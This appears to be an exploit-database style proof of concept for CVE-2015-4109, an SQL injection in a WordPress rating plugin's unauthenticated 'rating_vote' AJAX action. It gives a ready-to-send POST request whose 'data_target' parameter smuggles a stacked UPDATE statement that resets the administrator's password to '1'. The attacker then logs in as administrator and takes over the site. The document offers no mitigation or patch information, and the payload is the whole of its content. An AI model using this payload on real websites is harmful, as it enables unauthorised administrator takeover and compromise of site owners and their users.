# CVE: CVE-2015-4109

One can perform an SQL injection attack simply by exploiting wp_ajax_nopriv_rating_vote action.
POST parameters data_target and data_vote can be used to execute arbitrary SQL commands in the database.

In the following PoC we change the administrators password to '1'  so a malicious user can then login as the administrator, taking full control of the website.

* Send a post request to `http://my.vulnerable.website.com/wp-admin/admin-ajax.php` with data: action=rating_vote&data_id=1
&data_target=user_id IN (1); UPDATE wp_users set user_pass=MD5(1)  where ID &data_vote=1
* Login with administrator's user name and password '1'

Note that we assume that table name prefix is 'wp' and administrators user id is 1, a very common scenario.
